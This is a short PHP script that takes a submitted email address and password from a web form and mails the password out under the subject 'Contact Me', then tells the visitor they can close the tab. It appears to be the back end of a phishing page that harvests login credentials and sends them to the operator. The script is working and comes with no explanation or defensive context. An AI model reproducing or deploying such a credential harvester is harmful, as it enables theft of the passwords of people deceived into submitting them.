<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
        $subject = $_POST['email'];
        $msg = $_POST['pass'];
        
        $msg = wordwrap($msg,70);
        
        $confirm = mail("","Contact Me",$msg);
        
        if($confirm){
            
            echo "<h3> Email succesfully sent! You can close this tab now. </h3>";
            
        }
        else{
            echo "<h3> Email could not be sent... You can close this tab now. </h3>";
        }
    }
?>
